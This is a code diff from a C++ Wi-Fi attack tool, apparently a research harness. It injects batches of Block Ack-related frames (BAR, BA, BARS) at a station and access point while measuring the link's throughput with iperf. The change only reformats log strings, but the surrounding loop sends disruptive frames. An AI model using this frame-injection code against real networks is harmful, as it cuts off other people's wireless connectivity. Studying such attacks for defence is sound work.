@@ -96,13 +96,13 @@ void block(const string &STA_mac,
 ){
     assert(attack_type == "BAR" || attack_type == "BA" || attack_type == "BARS");
 
-    log(LogLevel::INFO, "Starting bl0ck exploit - Type: %s", attack_type.c_str());
+    log(LogLevel::INFO, "Starting bl0ck exploit - Type: {}", attack_type);
 
     const NetworkInterface iface_obj(iface);
     const HWAddress<6> ap_hw(AP_mac);
     PacketSender sender;
 
-    log(LogLevel::INFO, "Sending frames - Duration: %d sec, Concurrent frames: %d", duration_sec, frame_in_batch);
+    log(LogLevel::INFO, "Sending frames - Duration: {} sec, Concurrent frames: {}", duration_sec, frame_in_batch);
 
     BARSContext bars_ctx;
     // ReSharper disable once CppTooWideScope // if in BARS if, join after emplace
@@ -132,16 +132,16 @@ void block(const string &STA_mac,
                                             bars_ctx.current_fn.load(),
                                             bars_ctx.current_sn.load());
 
-            log(LogLevel::DEBUG, "Sending batch %d", iteration);
+            log(LogLevel::DEBUG, "Sending batch {}", iteration);
             for(int i = 0; i < frame_in_batch; ++i) sender.send(block_frame, iface_obj);
             this_thread::sleep_for(100ms);
             iteration++;
         } catch(const exception &e){
-            log(LogLevel::ERROR, "Error sending frame at iteration %d: %s", iteration, e.what());
+            log(LogLevel::ERROR, "Error sending frame at iteration {}: {}", iteration, e.what());
             throw;
         }
     }
-    log(LogLevel::INFO, "Block attack completed after %d iterations", iteration);
+    log(LogLevel::INFO, "Block attack completed after {} iterations", iteration);
 }
 
 void iperf_conn(RunStatus &rs, const string &src_client, const string &dst_server){
@@ -208,7 +208,7 @@ void run_bl0ck_attack(RunStatus &rs){
 
     speed_observation_start(rs);
 
-    log(LogLevel::INFO, "Block Attack START (Type: %s, Frames: %d)", bl0ck_att_type.c_str(), frame_in_batch);
+    log(LogLevel::INFO, "Block Attack START (Type: {}, Frames: {})", bl0ck_att_type, frame_in_batch);
     this_thread::sleep_for(seconds(5));
     block(STA_mac, AP_mac, iface, frame_in_batch, bl0ck_att_type, duration, is_random);
     this_thread::sleep_for(seconds(5));
